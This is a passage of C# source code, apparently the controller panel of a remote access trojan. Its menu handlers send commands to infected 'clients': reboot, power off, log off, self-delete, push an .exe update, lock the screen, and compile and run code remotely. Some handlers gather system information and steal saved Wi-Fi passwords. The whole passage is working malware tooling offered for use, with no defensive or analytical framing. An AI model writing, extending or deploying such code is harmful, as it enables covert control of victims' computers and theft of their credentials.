            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void stopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    var pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "option";
                    pack.ForcePathObject("Command").AsString = "Stop";
                    Clients client = (Clients)listViewItem.Tag;
                    ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void disconnnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    var pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "option";
                    pack.ForcePathObject("Command").AsString = "Disconnnect";
                    Clients client = (Clients)listViewItem.Tag;
                    ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void restartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    var pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "option";
                    pack.ForcePathObject("Command").AsString = "Restart";
                    Clients client = (Clients)listViewItem.Tag;
                    ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void updateToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                    using (var openFileDialog = new OpenFileDialog())
                    {
                        openFileDialog.Multiselect = false;
                        openFileDialog.Filter = "(*.exe)|*.exe";
                        if (openFileDialog.ShowDialog() == DialogResult.OK)
                        {
                            var listViewItem = (ListViewItem)listViewHome.Tag;
                            var pack = new MsgPack();
                            pack.ForcePathObject("Packet").AsString = "option";
                            pack.ForcePathObject("Command").AsString = "Update";
                            pack.ForcePathObject("File").LoadFileAsBytes(openFileDialog.FileName);
                            Clients client = (Clients)listViewItem.Tag;
                            ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
                        }
                    }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void deleteSelfToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    var pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "option";
                    pack.ForcePathObject("Command").AsString = "DeleteSelf";
                    Clients client = (Clients)listViewItem.Tag;
                    ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void reBootToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    var pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "option";
                    pack.ForcePathObject("Command").AsString = "ReBoot";
                    Clients client = (Clients)listViewItem.Tag;
                    ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void powerOffToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    var pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "option";
                    pack.ForcePathObject("Command").AsString = "PowerOff";
                    Clients client = (Clients)listViewItem.Tag;
                    ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void logOutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    var pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "option";
                    pack.ForcePathObject("Command").AsString = "LogOut";
                    Clients client = (Clients)listViewItem.Tag;
                    ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void messageBoxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var Msgbox = Interaction.InputBox("Type in the message", "Message Box", "Hello World!");
                    if (string.IsNullOrEmpty(Msgbox))
                    {
                        return;
                    }
                    var source = Resources.Message_Box.Replace("%qwqdanchun%", Msgbox);
                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    var pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "codedom";
                    pack.ForcePathObject("Name").AsString = "messageBox";
                    pack.ForcePathObject("assemblyBytes").SetAsBytes(Helper.Compile.Compiler("System.dll-=>System.Windows.Forms.dll", source));
                    Clients client = (Clients)listViewItem.Tag;
                    ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void visitWebsiteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var Msgbox = Interaction.InputBox("Type in the URL", "Visit Website",
                        "https://www.bing.com/");
                    if (string.IsNullOrEmpty(Msgbox))
                    {
                        return;
                    }
                    var source = Resources.Visit_Website.Replace("%qwqdanchun%", Msgbox);
                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    var pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "codedom";
                    pack.ForcePathObject("Name").AsString = "visitWebsite";
                    pack.ForcePathObject("assemblyBytes").SetAsBytes(Helper.Compile.Compiler("System.dll", source));
                    Clients client = (Clients)listViewItem.Tag;
                    ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void informationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    var pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "codedom";
                    pack.ForcePathObject("Name").AsString = "information";
                    pack.ForcePathObject("assemblyBytes").SetAsBytes(Helper.Compile.Compiler("System.dll-=>Microsoft.VisualBasic.dll-=>System.Management.dll-=>System.Core.dll-=>System.Windows.Forms.dll", Resources.Information));
                    Clients client = (Clients)listViewItem.Tag;
                    ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void wifiPasswordToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    var pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "codedom";
                    pack.ForcePathObject("Name").AsString = "wifiPassword";
                    pack.ForcePathObject("assemblyBytes").SetAsBytes(Helper.Compile.Compiler("System.dll-=>System.Xml.dll", Resources.Wifi_Password));
                    Clients client = (Clients)listViewItem.Tag;
                    ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void noteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var Msgbox = Interaction.InputBox("Type in the Note", "Note", "John Doe");

                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    if (!listViewItem.SubItems[2].Text.Contains("-"))
                    {
                        listViewItem.SubItems[2].Text = Msgbox + "-" + listViewItem.SubItems[2].Text;
                    }
                    else
                    {
                        listViewItem.SubItems[2].Text = Msgbox + "-" + listViewItem.SubItems[2].Text.Split(new[] { "-" }, StringSplitOptions.None)[1];
                    }

                    listViewHome.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);

                    XDocument myDoc = XDocument.Load(Path.Combine(Application.StartupPath, "Clients Folder", "Note.xml"));

                    IEnumerable<XElement> products = from c in myDoc.Descendants("Client") where c.FirstAttribute.Value == listViewItem.SubItems[3].Text select c;
                    if (products.Count() > 0)
                    {
                        XElement product = products.First();
                        product.ReplaceNodes(new XElement("Note", Msgbox));
                    }
                    else
                    {
                        XElement newElement = new XElement("Client", new XAttribute("HWID", listViewItem.SubItems[3].Text), new XElement("Note", Msgbox));
                        myDoc.Descendants("Clients").First().Add(newElement);
                    }
                    myDoc.Save(Path.Combine(Application.StartupPath, "Clients Folder", "Note.xml"));
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void lockToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    var pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "codedom";
                    pack.ForcePathObject("Name").AsString = "lock";
                    pack.ForcePathObject("assemblyBytes").SetAsBytes(Helper.Compile.Compiler("System.dll", Resources.LockScreen_ON));
                    Clients client = (Clients)listViewItem.Tag;
                    ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void unlockToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    var pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "codedom";
                    pack.ForcePathObject("Name").AsString = "unlock";
                    pack.ForcePathObject("assemblyBytes").SetAsBytes(Helper.Compile.Compiler("System.dll", Resources.LockScreen_OFF));
                    Clients client = (Clients)listViewItem.Tag;
                    ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void richTextBoxlog_TextChanged(object sender, EventArgs e)
        {
            richTextBoxlog.SelectionStart = richTextBoxlog.TextLength;
            richTextBoxlog.ScrollToCaret();
        }

        private void pingcheck_Tick(object sender, EventArgs e)
        {
            foreach (ListViewItem itm in listViewHome.Items)
            {
                Clients client = (Clients)itm.Tag;
                ThreadPool.QueueUserWorkItem(client.Ping);
            }
        }
    }
}